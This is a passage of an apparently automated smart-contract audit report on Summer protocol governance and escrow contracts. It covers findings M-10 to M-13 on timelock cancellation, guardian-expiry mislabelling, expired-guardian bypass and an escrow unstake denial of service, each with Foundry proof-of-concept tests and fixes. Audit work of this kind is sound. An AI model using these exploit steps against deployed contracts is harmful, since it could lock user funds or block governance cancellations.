        targets[1] = address(decoy);

        uint256[] memory values = new uint256[](2);
        values[0] = 0; values[1] = 0;

        bytes[] memory payloads = new bytes[](2);
        payloads[0] = abi.encodeWithSelector(Decoy.other.selector);
        payloads[1] = abi.encodeWithSelector(IProtocolAccessManager.setGuardianExpiration.selector, guardian, block.timestamp + 9 days);

        bytes32 pred = bytes32(0);
        bytes32 salt = bytes32("batch");
        vm.prank(attacker);
        tl.scheduleBatch(targets, values, payloads, pred, salt, 1);

        bytes32 id = tl.hashOperationBatch(targets, values, payloads, pred, salt);
        vm.expectRevert(bytes("Only governors can cancel guardian expiry proposals"));
        vm.prank(guardian);
        tl.cancel(id);
    }
}


## Suggested Mitigation
In schedule(), require both bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector AND target == address(accessManager). In scheduleBatch(), only set the flag when bytes4(payloads[i]) matches and targets[i] == address(accessManager). Also consider validating payload length >= 4 to avoid zero-padding edge cases: if (payloads[i].length >= 4 && bytes4(payloads[i]) == ...) { ... }.





 **Derived From** : cancel() ‘governors only’ path still enforces Timelock CANCELLER_ROLE via super.cancel

## [M-10]. Governors cannot cancel guardian-expiry ops unless also Timelock cancellers; proposer can flag ops to block intended cancellation

## Derived From Pattern/Invariant
cancel() ‘governors only’ path still enforces Timelock CANCELLER_ROLE via super.cancel

## Exploit Type
AccessControl

## Location
SummerTimelockController.cancel

## Minimim Privilege Required
RequiresRole

## Description
SummerTimelockController.cancel intends: “Guardian expiry proposals can ONLY be cancelled by governors.” The governor check is performed, but then the function calls super.cancel(id), which in OZ TimelockController is protected by onlyRole(CANCELLER_ROLE). As a result, a governor without the Timelock CANCELLER_ROLE will revert, defeating the stated rule. Additionally, schedule/scheduleBatch mark an operation as guardian-expiry solely by checking the calldata selector equals IProtocolAccessManager.setGuardianExpiration.selector, independent of the target. Thus, any PROPOSER_ROLE can schedule an operation with this selector in the payload and flag it as “guardian-expiry,” after which intended governors (without CANCELLER_ROLE) are blocked from cancelling it.

Vulnerable snippet:

function cancel(bytes32 id) public virtual override {
    if (_isGuardianExpiryProposal(id)) {
        require(
            accessManager.hasRole(accessManager.GOVERNOR_ROLE(), msg.sender),
            "Only governors can cancel guardian expiry proposals"
        );
        super.cancel(id); // parent enforces onlyRole(CANCELLER_ROLE)
        return;
    }
    ...
}

Impact: DoS of time-sensitive cancellation. Guardian-expiry or mis-flagged operations cannot be cancelled by governors unless they also hold the Timelock CANCELLER_ROLE, contradicting the policy and enabling a PROPOSER_ROLE to block intended cancellations.

## Impact
Governors cannot cancel guardian-expiry operations unless they also hold Timelock CANCELLER_ROLE, contradicting the documented invariant in the README that such ops may only be cancelled by Governors. A proposer can also mislabel arbitrary operations as guardian-expiry by using the selector in calldata, causing a stuck pending operation that intended governors cannot cancel. This is a functional DoS of a time-sensitive cancellation path and an explicit policy/invariant breach.

## Proof of Concept
- Setup Timelock with PROPOSER_ROLE assigned to attackerProposer; governors are tracked in accessManager but NOT granted Timelock CANCELLER_ROLE.
- attackerProposer schedules an operation whose calldata starts with setGuardianExpiration selector (target can even be arbitrary). This flags the op as guardian-expiry.
- A governor (without CANCELLER_ROLE) calls cancel(id). The governor check passes, but super.cancel enforces onlyRole(CANCELLER_ROLE) and reverts, preventing cancellation. attackerProposer also cannot cancel (fails governor check), resulting in a DoS on cancellation.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {SummerTimelockController} from "packages/gov-contracts/src/contracts/SummerTimelockController.sol";

contract StubAccessManager {
    bytes32 private constant _GOVERNOR_ROLE = keccak256("GOVERNOR_ROLE");
    bytes32 private constant _GUARDIAN_ROLE = keccak256("GUARDIAN_ROLE");

    mapping(bytes32 => mapping(address => bool)) internal _roles;
    mapping(address => uint256) public guardianExpirations;

    function GOVERNOR_ROLE() external pure returns (bytes32) { return _GOVERNOR_ROLE; }
    function GUARDIAN_ROLE() external pure returns (bytes32) { return _GUARDIAN_ROLE; }

    function grantGovernorRole(address account) external { _roles[_GOVERNOR_ROLE][account] = true; }
    function grantGuardianRole(address account) external { _roles[_GUARDIAN_ROLE][account] = true; }

    function hasRole(bytes32 role, address account) external view returns (bool) { return _roles[role][account]; }
    function isActiveGuardian(address account) external view returns (bool) {
        return _roles[_GUARDIAN_ROLE][account] && guardianExpirations[account] > block.timestamp;
    }

    // Only used for selector marking; no auth enforced here as we don't execute
    function setGuardianExpiration(address account, uint256 expiration) external {
        guardianExpirations[account] = expiration;
    }
}

contract SummerTimelockCancelTest is Test {
    SummerTimelockController timelock;
    StubAccessManager access;

    address proposer = address(0xBEEF);
    address governor = address(0xCAFE);
    bytes32 salt = bytes32("SALT");

    function setUp() public {
        access = new StubAccessManager();
        access.grantGovernorRole(governor);

        address[] memory proposers = new address[](1);
        proposers[0] = proposer; // OZ Timelock grants PROPOSER_ROLE and CANCELLER_ROLE to proposers
        address[] memory executors = new address[](0);

        timelock = new SummerTimelockController(0, proposers, executors, address(0), address(access));
    }

    function _schedule(bytes memory data, address target) internal returns (bytes32 id) {
        vm.prank(proposer);
        timelock.schedule(target, 0, data, bytes32(0), salt, 0);
        id = timelock.hashOperation(target, 0, data, bytes32(0), salt);
    }

    function test_GovernorCannotCancelGuardianExpiryWithoutCancellerRole() public {
        // Marked as guardian-expiry because of selector matching
        bytes memory data = abi.encodeWithSelector(
            StubAccessManager.setGuardianExpiration.selector,
            address(0x1234),
            block.timestamp + 8 days
        );
        bytes32 id = _schedule(data, address(access));

        vm.prank(governor);
        vm.expectRevert(); // passes governor check, then reverts in super.cancel for missing CANCELLER_ROLE
        timelock.cancel(id);
    }

    function test_MislabelledSelectorBlocksGovernorCancellation() public {
        // Any target + matching selector marks op as guardian-expiry
        bytes memory data = abi.encodeWithSelector(
            StubAccessManager.setGuardianExpiration.selector,
            address(0x1),
            uint256(123)
        );
        bytes32 id = _schedule(data, address(0xDEAD));

        vm.prank(governor);
        vm.expectRevert(); // still hits guardian-expiry branch, then super.cancel enforces CANCELLER_ROLE
        timelock.cancel(id);
    }

    function test_ProposerCannotCancelGuardianExpiry() public {
        bytes memory data = abi.encodeWithSelector(
            StubAccessManager.setGuardianExpiration.selector,
            address(0x5),
            uint256(999)
        );
        bytes32 id = _schedule(data, address(access));

        vm.prank(proposer);
        vm.expectRevert(bytes("Only governors can cancel guardian expiry proposals"));
        timelock.cancel(id);
    }
}


## Suggested Mitigation
Fix authorization and marking to align with the documented invariant: (A) Allow governors to cancel guardian-expiry operations without also requiring Timelock CANCELLER_ROLE; and (B) prevent mislabeling. Practical options: 1) Config-only: Grant CANCELLER_ROLE to all intended governors (and keep PROPOSER_ROLE/CANCELLER_ROLE for proposers). This makes the current super.cancel path pass for governors and preserves the policy in practice. 2) Code change (preferred): Fork/extend the OZ TimelockController used in this repo to expose an internal cancel primitive (e.g., make _timestamps internal and implement an internal _cancel(bytes32 id) that performs the same checks and state changes). In SummerTimelockController.cancel, when _isGuardianExpiryProposal(id) and governor check passes, call the internal _cancel directly instead of super.cancel, avoiding the CANCELLER_ROLE requirement for this specific case. 3) Tighten guardian-expiry marking: In schedule/scheduleBatch, only mark as guardian-expiry when (target == address(accessManager) && bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector). This prevents proposers from flagging unrelated targets via selector-only payloads. Optionally, decode parameters to ensure calldata shape is valid.





 **Derived From** : Selector-only flag lets proposers block guardian cancellation for any operation

## [M-11]. Proposers can bypass guardian cancellation by stuffing a dummy setGuardianExpiration selector in schedule/scheduleBatch

## Derived From Pattern/Invariant
Selector-only flag lets proposers block guardian cancellation for any operation

## Exploit Type
AccessControl

## Location
SummerTimelockController.scheduleBatch

## Minimim Privilege Required
RequiresRole

## Description
SummerTimelockController marks an operation as a guardian-expiry proposal solely by checking the first 4 bytes of calldata against IProtocolAccessManager.setGuardianExpiration.selector, without verifying that the target equals the ProtocolAccessManager. This occurs in both schedule() and scheduleBatch(). As a result, any address with PROPOSER_ROLE can include a no-op call to an arbitrary target with the matching selector to force _guardianExpiryOperations[id] = true. Then cancel() treats the operation as a guardian-expiry proposal and only allows governors with CANCELLER_ROLE to cancel it, preventing active guardians with CANCELLER_ROLE from cancelling. Vulnerable snippets:

// schedule
if (bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector) {
    _guardianExpiryOperations[id] = true;
}

// scheduleBatch
for (uint256 i = 0; i < payloads.length; i++) {
    if (bytes4(payloads[i]) == IProtocolAccessManager.setGuardianExpiration.selector) {
        _guardianExpiryOperations[id] = true;
    }
}

This misclassification is an authorization bypass of the intended cancellation policy: guardians should be able to cancel any non-expiry proposals, but proposers can arbitrarily reclassify proposals as expiry-only to block guardian cancellation.

## Impact
Functional: guardians with CANCELLER_ROLE are prevented from cancelling arbitrary queued operations, weakening the emergency backstop and potentially allowing harmful operations to avoid guardian cancellation until execution delay elapses.

## Proof of Concept
1) Deploy ProtocolAccessManager with a governor address G.
2) Deploy SummerTimelockController with minDelay=1, proposers=[P], executors=[E], admin=A, and accessManager set to the ProtocolAccessManager.
3) As G, grant GUARDIAN_ROLE to guardian address K and set guardian expiration to a future timestamp; as A, grant CANCELLER_ROLE to K on the timelock.
4) As P (has PROPOSER_ROLE), call scheduleBatch() with a single payload encoded as abi.encodeWithSelector(IProtocolAccessManager.setGuardianExpiration.selector, K, now+90 days) but target set to a bogus address (not the ProtocolAccessManager). This flags _guardianExpiryOperations[id] = true.
5) As K, attempt cancel(id). It reverts with "Only governors can cancel guardian expiry proposals" even though the batch does not actually call the accessManager, proving guardians are blocked from cancelling arbitrary batches.

## Proof of Code
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {SummerTimelockController} from "./SummerTimelockController.sol";

// Minimal mock that exposes only what SummerTimelockController uses
contract MockAccessManager {
    mapping(bytes32 => mapping(address => bool)) internal _roles;
    mapping(address => uint256) public guardianExpirations;

    function GOVERNOR_ROLE() external pure returns (bytes32) {
        return keccak256("GOVERNOR_ROLE");
    }

    function GUARDIAN_ROLE() external pure returns (bytes32) {
        return keccak256("GUARDIAN_ROLE");
    }

    function hasRole(bytes32 role, address account) external view returns (bool) {
        return _roles[role][account];
    }

    function grantGovernorRole(address account) external {
        _roles[keccak256("GOVERNOR_ROLE")][account] = true;
    }

    function grantGuardianRole(address account) external {
        _roles[keccak256("GUARDIAN_ROLE")][account] = true;
    }

    function setGuardianExpiration(address account, uint256 expiration) external {
        guardianExpirations[account] = expiration;
    }

    function isActiveGuardian(address account) external view returns (bool) {
        return _roles[keccak256("GUARDIAN_ROLE")][account] && guardianExpirations[account] > block.timestamp;
    }
}

contract TimelockGuardianExpiryBypassTest is Test {
    SummerTimelockController timelock;
    MockAccessManager accessManager;

    address admin = address(0xAD1N);
    address proposer = address(0xBEEF1);
    address executor = address(0xE1);
    address guardian = address(0xA11CE);

    function setUp() public {
        accessManager = new MockAccessManager();
        accessManager.grantGuardianRole(guardian);
        accessManager.setGuardianExpiration(guardian, block.timestamp + 30 days);

        address[] memory proposers = new address[](1);
        proposers[0] = proposer;
        address[] memory executors = new address[](1);
        executors[0] = executor;

        timelock = new SummerTimelockController(1, proposers, executors, admin, address(accessManager));

        // Give guardian the canceller role (but not governor role)
        vm.prank(admin);
        timelock.grantRole(timelock.CANCELLER_ROLE(), guardian);
        assertTrue(timelock.hasRole(timelock.CANCELLER_ROLE(), guardian));
    }

    function test_GuardianBlockedByDummySelector() public {
        // Payload that only matches the setGuardianExpiration selector, targeted to a bogus address
        bytes memory bogusPayload = abi.encodeWithSignature(
            "setGuardianExpiration(address,uint256)",
            guardian,
            block.timestamp + 90 days
        );
        address[] memory targets = new address[](1);
        targets[0] = address(0xDEAD); // not the accessManager
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory payloads = new bytes[](1);
        payloads[0] = bogusPayload;
        bytes32 pred = bytes32(0);
        bytes32 salt = keccak256("salt-flag");
        uint256 delay = 1;

        vm.prank(proposer);
        timelock.scheduleBatch(targets, values, payloads, pred, salt, delay);
        bytes32 id = timelock.hashOperationBatch(targets, values, payloads, pred, salt);
        assertTrue(timelock.isOperationPending(id));

        // Guardian attempt to cancel should revert because operation was wrongly flagged as guardian-expiry
        vm.prank(guardian);
        vm.expectRevert(bytes("Only governors can cancel guardian expiry proposals"));
        timelock.cancel(id);
    }

    function test_GuardianCanCancelNormalOp() public {
        // Schedule a normal op (no selector match)
        address[] memory targets = new address[](1);
        targets[0] = address(0xCAFE);
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory payloads = new bytes[](1);
        payloads[0] = hex""; // not matching selector
        bytes32 pred = bytes32(0);
        bytes32 salt = keccak256("salt-noflag");
        uint256 delay = 1;

        vm.prank(proposer);
        timelock.scheduleBatch(targets, values, payloads, pred, salt, delay);
        bytes32 id = timelock.hashOperationBatch(targets, values, payloads, pred, salt);
        assertTrue(timelock.isOperationPending(id));

        // Guardian should be able to cancel non-expiry operations
        vm.prank(guardian);
        timelock.cancel(id);
        assertFalse(timelock.isOperation(id));
    }
}


## Suggested Mitigation
Tighten the guardian-expiry classification by validating the call target and selector together. In schedule(): set the flag only if target == address(accessManager) AND bytes4(data) == IProtocolAccessManager.setGuardianExpiration.selector. In scheduleBatch(): set the flag only if targets[i] == address(accessManager) AND bytes4(payloads[i]) matches. Optionally, decode and validate calldata length and arguments to reduce false positives.





 **Derived From** : Expired guardians bypass onlyGuardianOrGovernor due to missing expiry check

## [M-12]. Expired guardian can call onlyGuardianOrGovernor-gated functions (e.g., xSUMR pause/unpause) despite expiration

## Derived From Pattern/Invariant
Expired guardians bypass onlyGuardianOrGovernor due to missing expiry check

## Exploit Type
AuthByPass

## Location
ProtocolAccessManaged.onlyGuardianOrGovernor

## Minimim Privilege Required
RequiresRole

## Description
ProtocolAccessManaged.onlyGuardianOrGovernor checks raw role bits via hasRole(GUARDIAN_ROLE, msg.sender) and ignores guardian expiration tracked in ProtocolAccessManager.guardianExpirations. As a result, any guardian whose expiry has passed but whose GUARDIAN_ROLE was not revoked can still pass the modifier and call sensitive functions intended only for active guardians or governors. Vulnerable snippet:

modifier onlyGuardianOrGovernor() {
    if (
        !_accessManager.hasRole(GUARDIAN_ROLE, msg.sender) &&
        !_accessManager.hasRole(GOVERNOR_ROLE, msg.sender)
    ) {
        revert CallerIsNotGuardianOrGovernor(msg.sender);
    }
    _;
}

Impact example: StakedSummerToken.pause()/unpause() are guarded by onlyGuardianOrGovernor. An expired guardian can pause xSUMR, preventing mint/burn and thereby blocking stake/unstake flows in SummerStaking (users cannot burn xSUMR to unstake), effectively locking user funds and disrupting governance participation until a governor intervenes.

## Impact
Both onlyGuardian and onlyGuardianOrGovernor modifiers rely on raw hasRole(GUARDIAN_ROLE, msg.sender) and ignore guardianExpirations, allowing any expired guardian who still holds the GUARDIAN_ROLE bit to invoke guardian-privileged actions across the system. This breaks the documented invariant that guardianship is time-bound and can lead to unauthorized pausing (e.g., xSUMR), disruption of maintenance operations, and potential protocol-wide DoS until a governor intervenes to unpause or revoke the stale role. The issue violates the README-stated invariant that guardian checks should respect expiration.

## Proof of Concept
1) Governor grants GUARDIAN_ROLE to Attacker.
2) Governor sets Attacker’s guardian expiration to now + MIN_GUARDIAN_EXPIRY.
3) Time passes beyond the expiration.
4) Attacker is no longer an active guardian (isActiveGuardian(attacker) == false) but still has the GUARDIAN_ROLE bit.
5) Attacker calls a function gated by onlyGuardianOrGovernor (e.g., xSUMR.pause()). The check passes because hasRole(GUARDIAN_ROLE, attacker) == true, ignoring expiration.
6) State changes (paused = true), causing DoS for stake/unstake flows that require xSUMR mint/burn.

## Proof of Code
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {ProtocolAccessManager} from "packages/access-contracts/src/contracts/ProtocolAccessManager.sol";
import {ProtocolAccessManaged} from "packages/access-contracts/src/contracts/ProtocolAccessManaged.sol";

contract DummyGuarded is ProtocolAccessManaged {
    bool public paused;
    constructor(address am) ProtocolAccessManaged(am) {}
    function pause() external onlyGuardianOrGovernor {
        paused = true;
    }
}

contract OnlyGuardianOrGovernor_Bypass_Test is Test {
    ProtocolAccessManager pam;
    DummyGuarded target;
    address gov = address(0xA11CE);
    address expiredGuardian = address(0xBEEF);

    function setUp() public {
        pam = new ProtocolAccessManager(gov);
        target = new DummyGuarded(address(pam));

        // Governor grants GUARDIAN_ROLE and sets a valid future expiration
        vm.startPrank(gov);
        pam.grantGuardianRole(expiredGuardian);
        pam.setGuardianExpiration(expiredGuardian, block.timestamp + pam.MIN_GUARDIAN_EXPIRY());
        vm.stopPrank();

        // Warp beyond expiration
        vm.warp(block.timestamp + pam.MIN_GUARDIAN_EXPIRY() + 1);
    }

    function testExpiredGuardianBypassesOnlyGuardianOrGovernor() public {
        // Sanity: guardian is not active anymore
        assertEq(pam.isActiveGuardian(expiredGuardian), false);
        // But still holds the raw GUARDIAN_ROLE bit
        assertEq(pam.hasRole(pam.GUARDIAN_ROLE(), expiredGuardian), true);

        // Expired guardian calls a function gated by onlyGuardianOrGovernor
        vm.prank(expiredGuardian);
        target.pause();

        // State changed -> bypass confirmed
        assertEq(target.paused(), true);
    }
}


## Suggested Mitigation
Update both modifiers in ProtocolAccessManaged to respect guardian expiration:

- onlyGuardian: use _accessManager.isActiveGuardian(msg.sender) instead of hasRole(GUARDIAN_ROLE, msg.sender).
- onlyGuardianOrGovernor: use _accessManager.isActiveGuardian(msg.sender) || _accessManager.hasRole(GOVERNOR_ROLE, msg.sender).

Example:
modifier onlyGuardian() {
    if (!_accessManager.isActiveGuardian(msg.sender)) {
        revert CallerIsNotGuardian(msg.sender);
    }
    _;
}

modifier onlyGuardianOrGovernor() {
    if (
        !_accessManager.isActiveGuardian(msg.sender) &&
        !_accessManager.hasRole(GOVERNOR_ROLE, msg.sender)
    ) {
        revert CallerIsNotGuardianOrGovernor(msg.sender);
    }
    _;
}

Additionally, review any other guardian gates in the codebase (including other access mix-ins) to ensure they consistently use isActiveGuardian.





 **Derived From** : Unstake forwards released tokens from escrow balance, causing DoS if wallet pays beneficiary

## [M-13]. Permissionless release causes permanent DoS in SummerVestingWalletsEscrow._unstakeFromFactory by draining escrow accounting

## Derived From Pattern/Invariant
Unstake forwards released tokens from escrow balance, causing DoS if wallet pays beneficiary

## Exploit Type
AccountingInvariantViolation

## Location
SummerVestingWalletsEscrow._unstakeFromFactory

## Minimim Privilege Required
Permissionless

## Description
In SummerVestingWalletsEscrow._unstakeFromFactory, the contract computes the SUMR amount released while staked as releasedWhileStaked = releasedAtUnstake - releasedAtStake and then attempts to transfer this amount to the user from the escrow's own SUMR balance: SUMMER_TOKEN.safeTransfer(_user, releasedWhileStaked). This assumes the vesting wallet releases tokens to the escrow. If the underlying vesting wallet (e.g., OZ VestingWallet) sends released tokens to the beneficiary (the user) rather than to the owner (the escrow), then the escrow will not hold those tokens. Anyone can permissionlessly call release() on the vesting wallet while the position is staked, increasing released() and sending the tokens to the user. Later, when the user calls unstakeVesting, releasedWhileStaked > 0 and the escrow attempts to pay from its own SUMR balance, which is zero, causing a revert. As a result, unstakeVesting always reverts: the vesting wallet ownership is never returned, and xSUMR is never burned. Core snippet: if (releasedWhileStaked > 0) { SUMMER_TOKEN.safeTransfer(_user, releasedWhileStaked); } IMinimalVestingWallet(vestingWallet).transferOwnership(_user); STAKED_SUMMER_TOKEN.burnFrom(_user, stakedBalance);

## Impact
Any account can permissionlessly call release() on the vesting wallet while the wallet is staked under the escrow. If the vesting wallet sends released tokens to the beneficiary (user) instead of the owner (escrow), the escrow will not hold the released tokens. On unstake, the escrow attempts to transfer releasedWhileStaked from its own balance and reverts due to insufficient funds. This permanently blocks unstake for that factory (ownership never returned; xSUMR never burned), effectively locking the position indefinitely unless the escrow is externally funded.

## Proof of Concept
Attack steps:
- Precondition: User’s vesting wallet is owned by the escrow; beneficiary remains the user (typical OZ VestingWallet semantics). User stakes via stakeVesting(). The escrow snapshots releasedAtStake.
- Anyone calls vestingWallet.release(SUMR) during the stake window. Tokens move from the vesting wallet to the beneficiary (user). The vesting wallet’s released(SUMR) increases; the escrow does not receive tokens.
- When the user later calls unstakeVesting(), the escrow computes releasedWhileStaked = releasedAtUnstake − releasedAtStake > 0 and executes SUMMER_TOKEN.safeTransfer(user, releasedWhileStaked) from the escrow’s own balance. Since the escrow has zero SUMR, the transfer reverts. Ownership is not returned and xSUMR is not burned, causing a permanent DoS for that position.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {SummerVestingWalletsEscrow} from "packages/gov-contracts/src/contracts/governance/SummerVestingWalletsEscrow.sol";

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract MockSUMR is IERC20Min {
    string public name = "SUMR";
    string public symbol = "SUMR";
    uint8 public decimals = 18;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external override returns (bool) {
        require(balanceOf[msg.sender] >= amt, "INSUFFICIENT");
        balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true;
    }
    function transferFrom(address from, address to, uint256 amt) external override returns (bool) {
        require(balanceOf[from] >= amt, "INSUFFICIENT");
        if (from != msg.sender) { require(allowance[from][msg.sender] >= amt, "NO_ALLOW"); allowance[from][msg.sender] -= amt; }
        balanceOf[from] -= amt; balanceOf[to] += amt; return true;
    }
    function approve(address sp, uint256 amt) external override returns (bool) { allowance[msg.sender][sp] = amt; return true; }
}

interface IMinimalVestingWalletLike {
    function owner() external view returns (address);
    function transferOwnership(address) external;
    function released(address token) external view returns (uint256);
    function release(address token) external; // permissionless
}

contract MockVestingWallet is IMinimalVestingWalletLike {
    address public override owner;
    address public beneficiary;
    MockSUMR public sumr;
    mapping(address => uint256) public override released;
    constructor(address _owner, address _beneficiary, MockSUMR _sumr) { owner = _owner; beneficiary = _beneficiary; sumr = _sumr; }
    function transferOwnership(address n) external override { require(msg.sender == owner, "not owner"); owner = n; }
    function release(address token) external override {
        require(token == address(sumr), "bad token");
        uint256 amt = sumr.balanceOf(address(this));
        released[token] += amt; require(sumr.transfer(beneficiary, amt));
    }
}

interface IMinimalVestingFactoryLike { function vestingWallets(address) external view returns (address); }

contract MockVestingFactory is IMinimalVestingFactoryLike {
    mapping(address => address) public wallet;
    function setWallet(address user, address w) external { wallet[user] = w; }
    function vestingWallets(address u) external view override returns (address) { return wallet[u]; }
}

interface IStakedSummerTokenLike { function mint(address, uint256) external; function burnFrom(address, uint256) external; }

contract MockXSUMR is IStakedSummerTokenLike {
    mapping(address => uint256) public bal;
    function mint(address to, uint256 amt) external override { bal[to] += amt; }
    function burnFrom(address from, uint256 amt) external override { require(bal[from] >= amt, "xSUMR too low"); bal[from] -= amt; }
}

interface IERC165 { function supportsInterface(bytes4) external view returns (bool); }
interface IProtocolAccessManager is IERC165 { function hasRole(bytes32, address) external view returns (bool); function FOUNDATION_ROLE() external view returns (bytes32); }

contract MockAccessManager is IProtocolAccessManager {
    function supportsInterface(bytes4) external pure returns (bool) { return true; } // accept any interfaceId to satisfy the constructor check
    function hasRole(bytes32, address) external pure returns (bool) { return false; }
    function FOUNDATION_ROLE() external pure returns (bytes32) { return bytes32(0); }
}

contract Escrow_Unstake_DoS_Test is Test {
    MockSUMR sumr; MockXSUMR xsumr; MockVestingFactory factory; MockVestingWallet wallet; SummerVestingWalletsEscrow escrow; MockAccessManager am;
    address user = address(0xBEEF); address attacker = address(0xA11CE);

    function setUp() public {
        am = new MockAccessManager();
        sumr = new MockSUMR();
        xsumr = new MockXSUMR();
        factory = new MockVestingFactory();
        address[] memory factories = new address[](1); factories[0] = address(factory);
        escrow = new SummerVestingWalletsEscrow(address(am), address(sumr), address(xsumr), factories);
        wallet = new MockVestingWallet(address(escrow), user, sumr);
        MockVestingFactory(address(factory)).setWallet(user, address(wallet));
        sumr.mint(address(wallet), 1_000 ether);
    }

    function test_UnstakeRevertsAfterPermissionlessRelease() public {
        // user stakes their vesting wallet
        vm.startPrank(user);
        address[] memory f = new address[](1); f[0] = address(factory);
        escrow.stakeVesting(f);
        vm.stopPrank();

        // anyone can call release() while staked; funds go to beneficiary (user), not escrow
        vm.prank(attacker);
        wallet.release(address(sumr));

        // sanity: escrow has no SUMR, but vesting wallet released() increased
        assertEq(sumr.balanceOf(address(escrow)), 0);
        assertGt(IMinimalVestingWalletLike(address(wallet)).released(address(sumr)), 0);

        // unstake reverts because escrow tries to pay from its own (zero) balance
        vm.startPrank(user);
        address[] memory f2 = new address[](1); f2[0] = address(factory);
        vm.expectRevert();
        escrow.unstakeVesting(f2);
        vm.stopPrank();
    }
}


## Suggested Mitigation
Do not transfer releasedWhileStaked from the escrow unless the escrow actually holds those tokens. Robust options:
- Minimal fix: Replace the unconditional transfer with a bounded payout to avoid revert: amountToPay = min(releasedWhileStaked, SUMMER_TOKEN.balanceOf(address(this))); if (amountToPay > 0) transfer it. This prevents DoS even if the escrow is unfunded.
- Preferred fix: Stop paying from the escrow entirely. On unstake, do not attempt SUMR transfers from the escrow. Instead, rely on the vesting wallet’s own release() to deliver vested tokens to its beneficiary (typically the user). Optionally, call vestingWallet.release(SUMMER_TOKEN) before or after transferring ownership (release is permissionless) to flush any remaining vested tokens directly to the beneficiary.
- If the intended design requires released tokens to accrue to the escrow during staking, enforce that assumption: at stake time validate the vesting wallet beneficiary equals the escrow; on unstake, call release(SUMMER_TOKEN) while the escrow is still owner to pull the tokens, then forward escrow-held balance to the user. Finally, transfer ownership back. In all cases, never make unstake depend on the escrow having a positive SUMR balance.



